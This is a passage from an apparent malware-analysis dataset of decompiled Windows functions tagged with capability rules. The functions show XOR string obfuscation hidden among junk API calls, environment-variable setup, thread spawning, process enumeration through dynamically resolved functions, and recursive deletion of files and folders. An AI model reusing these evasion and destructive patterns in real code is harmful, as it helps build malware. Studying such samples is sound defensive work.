*puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar7 = 0x41cd30;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar9 = &var_344h;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_344h, &var_bch);\n    var_2ch = 5;\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar2 != 0) {\n        var_24h = 0x69164d3a;\n        var_20h = 0x451f6f2a;\n        var_1ch = 0x4d2e6f27;\n        var_18h = 0x6f2a6908;\n        var_14h._0_1_ = 0x4d;\n        var_14h._1_1_ = 0x45;\n        var_8h = 0x69454d6f;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6f);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            if (iVar4 != 0x35ce9a) {\n                *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_2ch) ^ (iVar8 + iVar2)[&var_24h - iVar2];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x12);\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar2, &var_344h);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    iVar2 = fcn.004041e5();\n    var_38h = 6;\n    if (iVar2 != 0) {\n        if (2 < var_58h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_58h._1_1_ - 2) {\n                do {\n                    *0x41cd20 = *0x41cd20 + (&var_4ch)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_58h._1_1_ - 2);\n            }\n        }\n        *0x41cd20 = *0x41cd20 ^ 0x43103655;\n        iVar2 = fcn.0040bf00();\n        if (iVar2 != 0) {\n            if (*0x41cda8 < 6) {\n                var_99h._0_1_ = 5;\n                var_a8h = 0x2d106203;\n                var_a4h = 0x7b110873;\n                var_a0h = 0x19007320;\n                var_9ch = 0x5203;\n                var_9ah = 0x73;\n                stack0xffffff64 = 0xc41111f;\n                var_94h = 0x2a71177c;\n                var_90h = 0x791f7c01;\n                var_8ch = 0x197c7352;\n                var_88h._0_2_ = 0x4076;\n                var_88h._2_1_ = 0x60;\n                var_88h._3_1_ = 6;\n                var_84h = 0xb207763;\n                var_80h = 0x287f630e;\n                var_7ch = 0x79637c73;\n                var_78h = 0x196f613c;\n                var_74h = 0x4012603;\n                var_70h = 0x92e0311;\n                var_6ch = 0x2b03637c;\n                var_68h._0_2_ = 0x6e09;\n                var_68h._2_1_ = 0x58;\n                var_8h = 0x69385847;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x48);\n                uVar3 = (*pcVar6)(8, 0x44);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_3ch = &var_a8h - iVar2;\n                do {\n                    iVar4 = (*pcVar6)();\n                    if (iVar4 != 0x41d55d) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_2ch) ^ (iVar8 + iVar2)[var_3ch];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x43);\n            }\n            else {\n                var_24h = 0x2e69706b;\n                var_20h = 0x4035c20;\n                var_1ch = 0x5c575816;\n                var_18h = 0x63681d74;\n                var_8h = 0x63414a38;\n                var_4h._0_2_ = 0x676c;\n                uVar3 = (*pcVar6)(8, 0x11);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = 0;\n                var_3ch = &var_24h - iVar2;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    if (iVar4 != 0xa88bd4) {\n                        *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_3ch];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0x10);\n            }\n            var_b8h = 0xc;\n            var_b0h = 0;\n            var_b4h = 0;\n            (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)(iVar2, 1, &var_b4h, 0);\n            uVar3 = (*pcVar6)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    *0x41cd3c = fcn.0040c5e5();\n    *0x41cd3c = *0x41cd3c & 0xffff;\n    var_20h = 0x2711192d;\n    var_1ch = 0x11092b04;\n    var_18h = 0x424021c;\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x78;\n    var_8h = 0x78746148;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x77);\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_64h = &var_20h - iVar2;\n    var_3ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar4 != 0x559360) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_2ch) ^ (iVar8 + iVar2)[var_64h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_20h = 0x17303e01;\n    var_1ch = 0x3e26130e;\n    var_18h = 0x3e1f0f17;\n    var_14h._0_1_ = 0x3c;\n    var_14h._1_1_ = 0x79;\n    var_8h = 0x79514a72;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6a);\n    uVar3 = (*pcVar6)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_34h = &var_20h - iVar2;\n    var_64h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar4 != 0xb4e5b6) {\n            *(iVar8 + iVar2) = *(&var_8h + iVar8 % var_2ch) ^ (iVar8 + iVar2)[var_34h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    var_10h = 0x642d3f6a;\n    var_ch._0_2_ = 0x4f23;\n    var_60h = 0x41724c4f;\n    var_5ch._0_1_ = 0x47;\n    uVar3 = (*pcVar6)(8, 7);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar2 = var_3ch;\n    var_30h = 0;\n    var_34h = &var_10h - iVar8;\n    var_8h = iVar8;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0x5680b0) {\n            *(var_30h + iVar8) = *(&var_60h + var_30h % var_2ch) ^ (var_30h + iVar8)[var_34h];\n        }\n        var_30h = var_30h + 1;\n    } while (var_30h < 6);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_fch, iVar8, iVar2, *0x412140);\n    *0x41cd9c = fcn.00404521();\n    *0x41cd3c = 6000;\n    var_2ch = var_2ch & 0xff000000 | 0x452c4e;\n    var_10h = 0x7845486b;\n    var_ch._0_2_ = 0x5857;\n    uVar3 = (*pcVar6)(8, 4);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_34h = &var_2ch - iVar2;\n    var_60h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x4c895d) {\n            *(iVar8 + iVar2) = *(&var_10h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_34h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 3);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_13ch, iVar2, *0x41cd3c);\n    var_10h = 0xf1f1c3d;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 100);\n    var_2ch = 0x6a6a6e49;\n    var_28h = 0x6f64;\n    uVar3 = (*pcVar6)(8, 6);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_30h = &var_10h - iVar2;\n    var_34h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar4 != 0xc19102) {\n            *(iVar8 + iVar2) = *(&var_2ch + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_30h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_1ch = 0x3323503f;\n    var_18h = 0x5c163506;\n    var_14h._0_1_ = 0x29;\n    var_14h._1_1_ = 0x57;\n    var_10h = 0x574d3549;\n    var_ch._0_2_ = 0x4769;\n    uVar3 = (*pcVar6)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_30h = &var_1ch - iVar2;\n    var_2ch = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar4 != 0x52899e) {\n            *(iVar8 + iVar2) = *(&var_10h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_30h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_50h = 0x1b2c1419;\n    var_4ch = 0x161b221f;\n    var_48h._0_1_ = 0x20;\n    var_48h._1_1_ = 6;\n    var_48h._2_2_ = 0x3f1c;\n    var_44h = 0x1002;\n    var_42h._0_2_ = 0x737;\n    stack0xffffffbd = 0x1134;\n    var_3dh = 0x75;\n    var_18h = 0x75457574;\n    var_14h._0_1_ = 0x6f;\n    var_14h._1_1_ = 0x50;\n    var_42h._2_1_ = var_48h._1_1_;\n    uVar3 = (*pcVar6)(8, 0x15);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_10h = &var_50h - iVar2;\n    var_30h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar4 != 0x182622) {\n            *(iVar8 + iVar2) = *(&var_18h + iVar8 % var_38h) ^ (iVar8 + iVar2)[var_10h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    var_54h = 0xa5b361d;\n    var_50h = 0x3e03025e;\n    var_4ch = 0x1541a46;\n    var_48h._0_1_ = 0x1f;\n    var_48h._1_1_ = 0x38;\n    var_48h._2_2_ = 0x1a47;\n    var_44h = 0xe73;\n    var_42h._0_2_ = 0x323c;\n    var_42h._2_1_ = 0x35;\n    var_18h = 0x6e35574f;\n    var_14h._0_1_ = 0x31;\n    var_14h._1_1_ = 0x6f;\n    uVar3 = (*pcVar6)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_10h = &var_54h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar4 != 0xa8bb77) {\n            *(iVar8 + iVar2) = *(&var_18h + iVar8 % var_38h) ^ (iVar8 + iVar2)[&var_54h - iVar2];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_64h, var_34h);\n    (*pcVar6)(var_2ch, &var_fch);\n    (*pcVar6)(var_30h, 0x412144);\n    (*pcVar6)(iVar2, &var_13ch);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    puVar9 = puVar5;\n    for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar5 = 0x20;\n    *0x41cda0 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar6 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x41cd40 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004033f3, puVar5, 0, 0);\n    *0x41cd44 = (*pcVar6)(0, 0, fcn.0040d38e, *0x41cd94, 0, 0);\n    *0x41cd48 = (*pcVar6)(0, 0, fcn.00407294, puVar5, 0, 0);\n    *0x41cd4c = (*pcVar6)(0, 0, 0x40168c, puVar5, 0, 0);\n    uVar3 = (*pcVar6)(0, 0, fcn.004028ec, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, var_30h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_2ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_34h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_60h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_64h);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar1)(0, var_3ch);\n    (*pcVar6)(uVar3);\n    return 0;\n}\n",
        "token_count": 5510
    },
    "0040ddbf": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040ddbf(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t hFindFile;\n    uint var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar8 = 8;\n    var_20h = 0x104;\n    var_30h = fcn.0040d97f();\n    lpString2 = in_ECX;\n    if (var_30h != 0) {\n        lpString2 = var_30h;\n    }\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar2 = (*pcVar6)(8, var_18h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_14h != 0) {\n            uVar2 = (*pcVar6)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x55323016;\n                hFindFile = 0x5532304a;\n                var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x59);\n                uVar2 = (*pcVar6)(8, 9);\n                uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                var_1ch = uVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                    if (iVar4 != 0xdc55b6) {\n                        var_24h = 0x5;\n                        *(iVar8 + uVar3) = *(&hFindFile + iVar8 % 5) ^ (iVar8 + uVar3)[&var_ch - uVar3];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_3ch = 0x611a622f;\n                var_38h = 0x62595378;\n                var_34h._0_2_ = 0x6130;\n                hFindFile = 0x61306273;\n                var_28h._0_2_ = 0x5356;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar4 = 0;\n                var_24h = &var_3ch - iVar8;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                    iVar1 = var_14h;\n                    if (iVar5 != 0x3e6662) {\n                        var_24h = 0x6;\n                        *(iVar4 + iVar8) = *(&hFindFile + iVar4 % 6) ^ *((&var_3ch - iVar8) + iVar4 + iVar8);\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar8);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar1, lpFindFileData);\n                uVar3 = var_1ch;\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_24h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_24h != 0x2e) {\n                            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_24h);\n                            var_1ch = iVar4 + 2 + var_18h;\n                            if (var_20h < var_1ch) {\n                                uVar2 = (*pcVar6)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                uVar2 = (*pcVar6)(8, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_20h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar3);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_18h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_24h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar4 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.0040ddbf(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar4 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar4 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar4 != 0);\n                }\n                uVar2 = (*pcVar6)(0, iVar8);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar6)(0, uVar3);\n                (*pcVar7)(uVar2);\n                uVar2 = (*pcVar6)(0, lpFindFileData);\n                (*pcVar7)(uVar2);\n                iVar8 = var_ch;\n            }\n            uVar2 = (*pcVar6)(0, var_14h);\n            (*pcVar7)(uVar2);\n        }\n        if (lpFileName != 0) {\n            uVar2 = (*pcVar6)(0, lpFileName);\n            (*pcVar7)(uVar2);\n        }\n    }\n    if (var_30h != 0) {\n        uVar2 = (*pcVar6)(0, var_30h);\n        (*pcVar7)(uVar2);\n    }\n    return iVar8;\n}\n",
        "token_count": 1809
    },
    "0040e0ef": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040e0ef(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t dwSize;\n    \n    var_ch = 0xffffffff;\n    iVar10 = 0;\n    var_8h = 5;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x41cd90 == NULL) {\n        var_30h = 0x2723235b;\n        var_2ch = 0x2b331b59;\n        var_28h._0_2_ = 0x3527;\n        var_24h = 0x4b475735;\n        var_20h._0_1_ = 0x35;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar5 != 0xf36b49) {\n                *(iVar10 + iVar4) = *(&var_24h + iVar10 % var_8h) ^ (iVar10 + iVar4)[&var_30h - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_4ch = 0x23041979;\n        var_48h = 0x6144554;\n        var_44h = 0x843422f;\n        var_40h = 0x515f1f38;\n        var_3ch = 0x503b2702;\n        var_38h = 0x383a0443;\n        var_34h._0_1_ = 0x31;\n        var_24h = 0x56556d37;\n        var_20h._0_1_ = 0x31;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        var_10h = &var_4ch - iVar10;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0xdb4f1f) {\n                *(iVar4 + iVar10) = *(&var_24h + iVar4 % var_8h) ^ (iVar4 + iVar10)[&var_4ch - iVar10];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar10);\n        *0x41cd90 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41cd90)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar10 = (**0x41cd90)(5, piVar7, dwSize, 0);\n            uVar3 = var_18h;\n            if (-1 < iVar10) {\n                var_ch = 0;\n                piVar11 = piVar7;\n                do {\n                    iVar10 = piVar11[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41cd98)) {\n                        uVar8 = fcn.004074d8();\n                        uVar9 = fcn.0040e60d();\n                        iVar10 = (*var_1ch)(piVar11[0xf], uVar9, piVar11[0x11], piVar11[0x12], uVar8, uVar3);\n                        piVar7 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar7 = lpLibFileName;\n                    if (*piVar11 == 0) break;\n                    piVar11 = piVar11 + *piVar11;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar7, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1356
    },
    "0040ea7f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040ea7f(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2eh;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    iVar7 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (var_ch = param_1[1],  var_ch != NULL)) {\n        if (*param_1 == *var_ch) {\n            var_40h = 0x355a3036;\n            var_3ch = 0x290b3050;\n            var_38h = 0x20500346;\n            var_34h._0_1_ = 0x17;\n            var_8h = 6;\n            var_34h._1_1_ = 6;\n            stack0xffffffca = 0x36531743;\n            var_2eh._0_2_ = 0x4416;\n            var_28h = 0x71364464;\n            var_24h._0_2_ = 0x5335;\n            var_20h = param_2;\n            var_1ch = param_1;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar8 = 0;\n            var_14h = &var_40h - iVar7;\n            var_18h = iVar7;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar5 != 0xf4a94d) {\n                    *(iVar8 + iVar7) = *(&var_28h + iVar8 % var_8h) ^ (iVar8 + iVar7)[var_14h];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x14);\n            stack0xffffffd0 = 0x2723235b;\n            var_28h = 0x2b331b59;\n            var_24h._0_2_ = 0x3527;\n            var_8h = 0x4b475735;\n            var_4h._0_1_ = 0x35;\n            uVar4 = (*pcVar1)(8, 0xb);\n            iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar5 = 0;\n            iVar7 = &var_2eh + (2 - iVar8);\n            var_14h = iVar7;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                iVar2 = var_18h;\n                if (iVar6 != 0xf36b49) {\n                    var_14h = 5;\n                    *(iVar5 + iVar8) = *(&var_8h + iVar5 % 5) ^ (iVar5 + iVar8)[iVar7];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 10);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar8, var_18h);\n            var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n            piVar3 = var_ch;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_ch[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar7 = *piVar3;\n            var_1ch = var_1ch[1] + 0xc;\n            fcn.0040e9ed();\n            piVar3 = var_ch;\n            iVar7 = (*var_18h)(2, var_8h, var_ch[1], var_1ch, iVar7 + -0xc, &var_10h);\n            var_ch = iVar7;\n            if (iVar7 == 0) {\n                if (var_10h == piVar3[1]) {\n                    var_20h[1] = var_8h;\n                    *var_20h = var_10h;\n                }\n                else {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    iVar7 = -0x3fffff85;\n                }\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = (*pcVar1)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            iVar7 = -0x3fffff85;\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 1309
    },
    "0040f4a9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
